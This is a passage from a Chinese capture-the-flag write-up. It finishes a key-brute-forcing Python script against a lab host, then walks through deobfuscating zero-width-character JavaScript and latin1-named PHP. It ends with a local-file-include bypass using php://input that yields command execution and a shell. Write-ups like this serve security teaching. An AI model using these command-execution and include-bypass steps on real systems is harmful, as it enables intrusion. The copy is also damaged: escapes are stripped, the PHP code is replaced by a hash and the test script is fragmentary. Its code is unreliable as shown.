                conn = httplib.HTTPConnection('192.168.8.144', timeout=3)
                conn.request(method='POST',url='/',body=body,headers=headers)
                conn.getresponse()
                conn.close()
            except:
                key += payload
                print "n retrive...",key
得到Key。post提交key=3e9220818780da69c1df739fa7564ada到index.php?cmd=id即可执行任意命令,最终getshell。
**  
**
**0x03 高分靶机:**
最后是一道代码混淆的题目, JS混淆和PHP混淆。首先我们看看JS代码:
    var _0x6788=["x39x28x22u200Du200Bu200Du200Cu200Du200CuFEFFu200Du200Du200BuFEFFu200CuFEFFu200CuFEFFuFEFFu200Du200Cu200Cu200Bu200Du200Cu200Du200Du200Du200Bu200Cu200DuFEFFu200Bu200Bu200DuFEFFu200CuFEFFuFEFFuFEFFu200Cu200Du200BuFEFFu200BuFEFFu200Bu200Du200Cu200Du200DuFEFFu200Bu200Cu200DuFEFFu200BuFEFFu200CuFEFFu200BuFEFFu200CuFEFFu200BuFEFFuFEFFuFEFFu200Bu200CuFEFFuFEFFu200BuFEFFu200DuFEFFu200Bu200CuFEFFuFEFFu200Bu200Du200BuFEFFu200Bu200CuFEFFuFEFFu200BuFEFFuFEFFu200Du200Cu200DuFEFFu200Du200CuFEFFu200DuFEFFu200Bu200Du200CuFEFFu200Bu200Cu200Du200Du200CuFEFFu200BuFEFFu200BuFEFFu200Du200Du200Cu200DuFEFFu200Du200Cu200Du200CuFEFFu200Bu200Du200BuFEFFu200BuFEFFu200BuFEFFu200Bu200Cu200Du200Du200Cu200Du200Cu200Du200CuFEFFu200DuFEFFu200Bu200Du200BuFEFFu200Bu200Du200DuFEFFu200Bu200Du200CuFEFFu200Bu200DuFEFFu200Du200CuFEFFu200Du200Du200Cu200DuFEFFu200Du200CuFEFFu200DuFEFFu200Cu200Du200BuFEFFu200Bu200Cu200Bu200Du200CuFEFFu200Bu200Du200Cu200Bu200Bu200Du200Cu200Bu200Cu200Du200BuFEFFu200Bu200Du200Cu200Bu200Bu200Du200Cu200BuFEFFu200Du200Cu200Du200DuFEFFu200Cu200Bu200Cu200Du200Cu200BuFEFFu200Du200Cu200Bu200Bu200Du200Cu200Du200BuFEFFu200Cu200CuFEFFuFEFFu200Cu200Du200Bu200Du200Bu200Du200Bu200Du200Cu200CuFEFFu200Du200Cu200Du200Du200Du200BuFEFFu200Cu200Du200Cu200Du200DuFEFFu200CuFEFFuFEFFu200Du200Cu200Cu200Du200Du200BuFEFFu200BuFEFFu200CuFEFFuFEFFu200Du200Bu200DuFEFFu200Du200Cu200CuFEFFu200Du200Cu200Du200DuFEFFu200CuFEFFuFEFFu200Du200Cu200Cu200Bu200Du200Cu200Du200Du200Du200Bu200Cu200DuFEFFu200Bu200Bu200BuFEFFu200Cu200Du200BuFEFFu200Cu200Cu200DuFEFFu200Bu200Cu200Bx22x2Ex30x28x2Fx2Ex7Bx34x7Dx2Fx67x2Cx33x28x61x29x7Bx63x20x35x3Dx7Bx22u200Bx22x3Ax22x38x22x2Cx22u200Cx22x3Ax22x36x22x2Cx22u200Dx22x3Ax22x37x22x2Cx22uFEFFx22x3Ax22x62x22x7Dx3Bx31x20x65x2Ex64x28x66x28x61x2Ex30x28x2Fx2Ex2Fx67x2Cx33x28x61x29x7Bx31x20x35x5Bx61x5Dx7Dx29x2Cx32x29x29x7Dx29x29x28x29","x7C","x73x70x6Cx69x74","x72x65x70x6Cx61x63x65x7Cx72x65x74x75x72x6Ex7Cx7Cx66x75x6Ex63x74x69x6Fx6Ex7Cx7Cx72x65x70x7Cx31x30x7Cx30x31x7Cx31x31x7Cx46x75x6Ex63x74x69x6Fx6Ex7Cx7Cx30x30x7Cx76x61x72x7Cx66x72x6Fx6Dx43x68x61x72x43x6Fx64x65x7Cx53x74x72x69x6Ex67x7Cx70x61x72x73x65x49x6Ex74x7C","x72x65x70x6Cx61x63x65","","x5Cx77x2B","x5Cx62","x67"];eval(function(_0xc8b9x1,_0xc8b9x2,_0xc8b9x3,_0xc8b9x4,_0xc8b9x5,_0xc8b9x6){_0xc8b9x5=function(_0xc8b9x3){return _0xc8b9x3.toString(36)};if(!_0x6788[5][_0x6788[4]](/^/,String)){while(_0xc8b9x3--){_0xc8b9x6[_0xc8b9x3.toString(_0xc8b9x2)]=_0xc8b9x4[_0xc8b9x3]||_0xc8b9x3.toString(_0xc8b9x2)};_0xc8b9x4=[function(_0xc8b9x5){return _0xc8b9x6[_0xc8b9x5]}];_0xc8b9x5=function(){return _0x6788[6]};_0xc8b9x3=1;};while(_0xc8b9x3--){if(_0xc8b9x4[_0xc8b9x3]){_0xc8b9x1=_0xc8b9x1[_0x6788[4]]( new RegExp(_0x6788[7]+_0xc8b9x5(_0xc8b9x3)+_0x6788[7],_0x6788[8]),_0xc8b9x4[_0xc8b9x3])}};return _0xc8b9x1;}(_0x6788[0],17,17,_0x6788[3][_0x6788[2]](_0x6788[1]),0,{}));
把eval改成console.log运行看看,得到:
Function("‍‍‌‍‌﻿‍‍﻿‌﻿‌﻿﻿‍‌‌‍‌‍‍‍‌‍﻿‍﻿‌﻿﻿﻿‌‍﻿﻿‍‌‍‍﻿‌‍﻿﻿‌﻿﻿‌﻿﻿﻿﻿‌﻿﻿﻿‍﻿‌﻿﻿‍﻿‌﻿﻿﻿﻿‍‌‍﻿‍‌﻿‍﻿‍‌﻿‌‍‍‌﻿﻿﻿‍‍‌‍﻿‍‌‍‌﻿‍﻿﻿﻿‌‍‍‌‍‌‍‌﻿‍﻿‍﻿‍‍﻿‍‌﻿‍﻿‍‌﻿‍‍‌‍﻿‍‌﻿‍﻿‌‍﻿‌‍‌﻿‍‌‍‌‌‍﻿‍‌‍‌﻿‍‌‍‍﻿‌‌‍‌﻿‍‌‍‌‍﻿‌‌﻿﻿‌‍‍‍‍‌‌﻿‍‌‍‍‍﻿‌‍‌‍‍﻿‌﻿﻿‍‌‌‍‍﻿﻿‌﻿﻿‍‍﻿‍‌‌﻿‍‌‍‍﻿‌﻿﻿‍‌‌‍‌‍‍‍‌‍﻿﻿‌‍﻿‌‌‍﻿‌".replace(/.{4}/g,function(a){var
rep={"":"11","‌":"10","‍":"01","﻿":"00"};return
String.fromCharCode(parseInt(a.replace(/./g,function(a){return
rep[a]}),2))}))()
再将Function改为成console.log,删去结尾的()即可得到:
var key= '3e9220818780da69c1df739fa7564ada';console.log('where is the key?');
这里的JS其实是用unicode的零宽空白符(会使字符串看起来长度是0)替换了字符串二进制的0和1:'uFEFF'替换'00','u200d'替换'01',
'u200c'替换'10','u200b'替换'11'。最终执行的时候再替换回来。但是很显然一个console.log就可以解决它。
再看看PHP代码:
    290a1791da62e758b6bcc21057a2b74b
这里用到了什么原理呢?PHP的变量支持latin1 字符的范围,也就是ASCII:0-255(x00-xff),我们写个PHP脚本测试一下:
    ";
        }
    }
    ?>
最终程序输出的ASCII就是PHP合法的变量名。
"A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z,
_, a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y,
z, , ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?,
?, ?, ?, ?, ?, ?, ?, ?, , ¡, ¢, £, ¤, ¥, ¦, §, ¨, ©, ª, «, ¬, ­, ®, ¯, °, ±,
², ³, ´, µ, ¶, ·, ¸, ¹, º, », ¼, ½, ¾, ¿, À, Á, Â, Ã, Ä, Å, Æ, Ç, È, É, Ê, Ë,
Ì, Í, Î, Ï, Ð, Ñ, Ò, Ó, Ô, Õ, Ö, ×, Ø, Ù, Ú, Û, Ü, Ý, Þ, ß, à, á, â, ã, ä, å,
æ, ç, è, é, ê, ë, ì, í, î, ï, ð, ñ, ò, ó, ô, õ, ö, ÷, ø, ù, ú, û, ü, ý, þ, ÿ"
而上面那一段混淆后的PHP代码就是使用这些字符做变量名。清楚了这一点之后,只需把他们当作普通变量名,跟着流程耐心替换走一遍就行。
结合之前得到的Key,从混淆的PHP源码中得到:
    function filterIllegalChar($name){
        if(preg_match('/(http|.|/.+/)/i', $name)){
            die("file is illegal");
        }else{
            return $name;
        }
    };
    $file = filterIllegalChar($_GET['0kee_360_cn']);    
    include($file);
filterIllegalChar过滤了http和../,那么可以利用php://input输入流来突破,如下:
challenge.php?key=3e9220818780da69c1df739fa7564ada&0kee_360_cn=php://input,同时post提交
即可getshell。